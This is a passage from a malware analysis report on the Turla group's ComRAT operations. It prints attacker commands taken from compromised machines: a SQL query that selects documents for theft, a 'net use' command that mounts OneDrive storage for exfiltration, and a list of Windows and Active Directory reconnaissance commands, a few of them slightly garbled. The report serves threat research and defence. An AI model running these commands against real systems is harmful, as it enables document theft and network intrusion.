#Insight into attacker’s activityDuring our investigation, we were able to get insights about what Turla operators were doing on the compromised machines.The main use of ComRAT is discovering, stealing and exfiltrating confidential documents. In one case, its operators even deployed a .NET executable to interact with the victim’s central MS SQL Server database containing the organization’s documents. Figure 4 is the redacted SQL command. 


## sqlCommand.CommandText = “select top “ + num2.ToString() + “ filename, img, datalength(img), id from <Redacted> with(nolock) where not img is null and id>” + num4.ToString();sqlCommand.CommandText += “ and datalength(img)<1500000 and (filename like ‘%.doc’ or filename like ‘%.docx’ or filename like ‘[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%.pdf’ or (filename like ‘3%.pdf’ and len(filename)>9))”;sqlCommand.CommandText += “ order by id”;


#These documents were then compressed and exfiltrated to a cloud storage provider such as OneDrive or 4shared. Cloud storage is mounted using the net use command as shown in Figure 5.

## tracert -h 10 yahoo.com
net use https://docs.live.net/E65<redacted> <redacted password> /u:<redacted>@aol.co.uk
tracert -h 10 yahoo.com

In addition to document stealing, the operators also run many commands to gather information about the Active Directory groups or users, the network or Microsoft Windows configurations such as the group policies. Figure 6 is a list of commands executed by Turla operators.

## gpresult /z
gpresult /v
gpresult
net view
net view /domain
netstat
netstat -nab
netstat -nao
nslookup 127.0.0.1
ipconfig /all
arp -a
net share
net use
systeminfo
net user
net user administrator
net user /domain
net group
net group /domain
net localgroup
net localgroup
net localgroup Administrators
net group “Domain Computers” /domain
net group “Domain Admins” /domain
net group “Domain Controllers” /domain
dir “%programfiles%”
net group “Exchange Servers” /domain
net accounts
net accounts /domain
net view 127.0.0.1 /all
net session
route printip
config /displaydns

